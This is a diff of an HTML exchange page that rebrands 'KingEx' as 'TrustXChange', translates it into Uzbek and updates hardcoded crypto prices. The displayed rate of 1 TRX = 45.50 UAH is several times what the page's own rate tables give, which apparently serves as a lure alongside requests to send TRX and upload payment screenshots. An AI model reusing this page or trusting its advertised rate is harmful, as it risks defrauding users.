@@ -4,12 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="static/exchange_1.css">
-    <title>KingEx</title>
+    <title>TrustXChange</title>
 </head>
 <body>
     <div class="header">
         <div class="logo">
-            <h3 style="color: #10d078; font-size: 18px;">KingEx</h3>
+            <h3 style="color: #10d078; font-size: 18px;">TrustXChange</h3>
         </div>
     </div>
 
@@ -19,20 +19,20 @@
         <div class="exchange-container">
             <div class="exchange-info">
                 <div class="info-header">
-                    <h4>Exchange Information</h4>
+                    <h4>Алмашинув ҳақида маълумот</h4>
                 </div>
                 <div class="info-steps">
                     <div class="step">
                         <span class="step-number">1</span>
-                        <p>Create exchange order</p>
+                        <p>Алмашинув буйруғини яратиш</p>
                     </div>
                     <div class="step">
                         <span class="step-number">2</span>
-                        <p>Send TRX to Kingex</p>
+                        <p>TRXни TrustXChange'га юбориш</p>
                     </div>
                     <div class="step">
                         <span class="step-number">3</span>
-                        <p>Receive UAH to your card</p>
+                        <p>Картангизга UAH қабул қилиш</p>
                     </div>
                 </div>
             </div>
@@ -43,17 +43,17 @@
             <div class="currency-exchange">
                 <div class="exchange-row">
                     <div class="currency-input">
-                            <label>From</label>
+                            <label>Қаердан</label>
                             <select id="toFiatCurrency" class="currency-select">
-                                <option value="UAH">UAH (Card)</option>
-                                <option value="UZB">UZ (UZBK)</option>
+                                <option value="UAH">UAH (Карта)</option>
+                                <option value="UZB">UZ (Ўзбекистон сўми)</option>
                                 <option value="USD">USD</option>
                             </select>
                             <input type="number" placeholder="0.00" id="fromAmount">
                         </div>
                         <div class="exchange-arrow" id="reverseExchange">⇄</div>
                         <div class="currency-input">
-                            <label>To</label>
+                            <label>Қаерга</label>
                             <select id="fromCurrency" class="currency-select">
                                 <option value="TRX">TRON (TRX)</option>
                                 <option value="ETH">Ethereum (ETH)</option>
@@ -69,45 +69,45 @@
                     </div>
 
                 <div class="rate-info">
-                    <p>Exchange rate: <span id="exchangeRate">1 TRX = 25.50 UAH</span></p>
-                    <p>Fee: <span id="exchangeFee">0.5 TRX</span></p>
+                    <p>Алмашинув курси: <span id="exchangeRate">1 TRX = 45.50 UAH</span></p>
+                    <p>Комиссия: <span id="exchangeFee">0.5 TRX</span></p>
                 </div>
             </div>
 
             <!-- Платежная информация -->
             <div class="payment-info">
-                <h4>Payment Details</h4>
+                <h4>Тўлов маълумотлари</h4>
                 <div class="card-details" id="paymentDetails">
                     <!-- Данные будут подгружаться через JS -->
-                    <p><strong>Card number:</strong> <span id="cardNumber">Loading...</span></p>
-                    <p><strong>Card holder:</strong> <span id="cardHolder">Loading...</span></p>
+                    <p><strong>Карта рақами:</strong> <span id="cardNumber">Loading...</span></p>
+                    <p><strong>Карта эгаси:</strong> <span id="cardHolder">Loading...</span></p>
                 </div>
             </div>
 
             <!-- Форма подтверждения -->
             <form id="paymentForm">
                 <div class="form-group">
-                    <label>Your TRX wallet address</label>
-                    <input type="text" name="trx_wallet" placeholder="Enter your TRX address" required>
+                    <label>TRX ҳамёнингиз манзили</label>
+                    <input type="text" name="trx_wallet" placeholder="TRX манзилингизни киритинг" required>
                 </div>
 
                 <div class="form-group">
-                    <label>Your email</label>
-                    <input type="email" name="email" placeholder="Enter your email" required>
+                    <label>Электрон почтангизни киритинг</label>
+                    <input type="email" name="email" placeholder="Электрон почтангизни киритинг" required>
                 </div>
 
                 <div class="form-group">
-                    <label>Payment receipt (screenshot)</label>
+                    <label>Тўлов чеки (скриншот)</label>
                     <input type="file" name="receipt" accept="image/*" required>
-                    <p class="hint">Please attach proof of payment</p>
+                    <p class="hint">Илтимос, тўлов тасдиғини юкланг</p>
                 </div>
 
-                <button type="submit" class="submit-btn">Confirm Exchange</button>
+                <button type="submit" class="submit-btn">Алмашинувни тасдиқлаш</button>
             </form>
 
             <div id="successMessage" class="success-message">
-                <h3>Exchange Successful!</h3>
-                <p>Your funds will be processed shortly.</p>
+                <h3>Алмашинув муваффақиятли амалга ошди!</h3>
+                <p>Пулларингиз тез орада қайта ишланади.</p>
             </div>
         </div>
     </div>
@@ -115,20 +115,20 @@
     const API_URL = "https://www.trustxchange.online";
 
     const fiatRates = {
-        UAH: 38.5,  // курс UAH к USD
-        UZB: 11000, // курс UZB к USD
+        UAH: 45.50,  // курс UAH к USD
+        UZB: 12600, // курс UZB к USD
         USD: 1
     };
 
     const cryptoRates = {
-        TRX: 0.07,  // цена TRX в USD
-        ETH: 2000,  // цена ETH в USD
-        BTC: 40000, // цена BTC в USD
+        TRX: 0.28,  // цена TRX в USD
+        ETH: 2700,  // цена ETH в USD
+        BTC: 105000, // цена BTC в USD
         USDT: 1,    // цена USDT в USD
-        SOL: 100,   // цена SOL в USD
-        LTC: 70,    // цена LTC в USD
-        XRP: 0.5,   // цена XRP в USD
-        DOGE: 0.08  // цена DOGE в USD
+        SOL: 170,   // цена SOL в USD
+        LTC: 88,    // цена LTC в USD
+        XRP: 2.40,   // цена XRP в USD
+        DOGE: 0.18  // цена DOGE в USD
     };
 
     const fees = {
